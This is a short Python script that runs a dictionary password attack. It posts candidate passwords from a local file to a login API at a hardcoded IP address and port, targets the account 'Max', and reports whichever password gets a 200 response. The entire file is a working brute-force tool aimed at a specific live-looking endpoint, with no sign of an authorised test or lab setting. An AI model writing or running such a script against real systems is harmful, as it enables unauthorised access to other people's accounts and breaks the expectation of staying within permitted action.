import requests

# Target information
url = "http://98.70.102.40:8080/api/auth/secure-login"
username = "Max"

# Path to your password dictionary file
dictionary_path = "passwords.txt"

# Function to attempt login with a given password
def attempt_login(password):
    data = {"username": username, "password": password}
    try:
        response = requests.post(url, json=data, timeout=5)
        print(f"Trying: {password} --> Status: {response.status_code}")
        if response.status_code == 200:
            print(f"\n✅ Success! Password found: {password}")
            return True
    except requests.RequestException as e:
        print(f"Request error with password '{password}': {e}")
    return False

# Read the dictionary file and attempt logins
try:
    with open(dictionary_path, "r") as file:
        for line in file:
            password = line.strip()
            if attempt_login(password):
                break
except FileNotFoundError:
    print(f"Dictionary file not found: {dictionary_path}")
except Exception as e:
    print(f"An error occurred: {e}")
